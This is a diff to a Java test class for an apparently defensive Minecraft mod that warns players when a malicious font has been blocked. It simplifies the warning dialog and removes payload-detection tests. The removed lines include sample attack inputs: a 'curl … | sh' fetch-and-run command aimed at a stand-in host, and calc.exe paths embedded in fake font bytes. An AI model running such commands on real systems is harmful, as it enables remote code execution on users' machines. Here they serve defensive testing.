@@ -37,13 +37,12 @@ class NotifyTest {
 
     @Test
     void warningShowsAConfirmScreenWithBothButtons() {
-        Notify.warnAboutBlockedFont("C:\\Windows\\System32\\calc.exe");
+        Notify.warnAboutBlockedFont();
 
         assertTrue(client.currentScreen instanceof ConfirmScreen, "expected a confirm screen");
         ConfirmScreen screen = (ConfirmScreen) client.currentScreen;
         assertEquals("minecraft2shell-fix", screen.title.getString());
         assertTrue(screen.message.getString().contains("minecraft2shell"), screen.message.getString());
-        assertTrue(screen.message.getString().contains("calc.exe"), screen.message.getString());
         assertTrue(screen.message.getString().contains("已經攔截"), screen.message.getString());
         assertTrue(screen.yesButton.getString().contains("繼續遊玩"), screen.yesButton.getString());
         assertTrue(screen.noButton.getString().contains("中斷連線"), screen.noButton.getString());
@@ -51,17 +50,20 @@ class NotifyTest {
     }
 
     @Test
-    void unknownCommandStillProducesAReadableMessage() {
-        Notify.warnAboutBlockedFont(null);
+    void messageDoesNotPromiseACommandItCannotKnow() {
+        Notify.warnAboutBlockedFont();
 
         ConfirmScreen screen = (ConfirmScreen) client.currentScreen;
         assertNotNull(screen);
-        assertTrue(screen.message.getString().contains("無法辨識"), screen.message.getString());
+        assertFalse(screen.message.getString().contains("{"),
+                "no placeholder may leak into the dialog: " + screen.message.getString());
+        assertFalse(screen.message.getString().contains("指令"),
+                "the dialog must not claim to know the command: " + screen.message.getString());
     }
 
     @Test
     void continueButtonKeepsThePlayerConnected() {
-        Notify.warnAboutBlockedFont("curl http://example.test/x.sh | sh");
+        Notify.warnAboutBlockedFont();
 
         ((ConfirmScreen) client.currentScreen).callback.accept(true);
 
@@ -70,7 +72,7 @@ class NotifyTest {
 
     @Test
     void disconnectButtonDropsTheConnection() {
-        Notify.warnAboutBlockedFont("calc.exe");
+        Notify.warnAboutBlockedFont();
 
         ((ConfirmScreen) client.currentScreen).callback.accept(false);
 
@@ -82,7 +84,7 @@ class NotifyTest {
         System.setProperty(FixPolicy.PROP_NOTIFY, "false");
         FaceGuard.clearForTests();
 
-        Notify.warnAboutBlockedFont("calc.exe");
+        Notify.warnAboutBlockedFont();
 
         assertEquals(null, client.currentScreen);
     }
@@ -101,18 +103,4 @@ class NotifyTest {
         assertEquals(null, client.currentScreen, "the same font must not warn twice");
     }
 
-    @Test
-    void payloadHintFindsACommandInsideFontBytes() {
-        byte[] font = ("\u0000\u0001junkjkunk \u0001\u0001C:\\Windows\\System32\\calc.exe\u0001\u0002")
-                .getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
-
-        assertEquals("C:\\Windows\\System32\\calc.exe", PayloadHint.find(font));
-    }
-
-    @Test
-    void payloadHintIgnoresOrdinaryFontData() {
-        byte[] font = "abcdef ghijkl mnopqr stuvwx".getBytes(java.nio.charset.StandardCharsets.ISO_8859_1);
-
-        assertEquals(null, PayloadHint.find(font));
-    }
 }
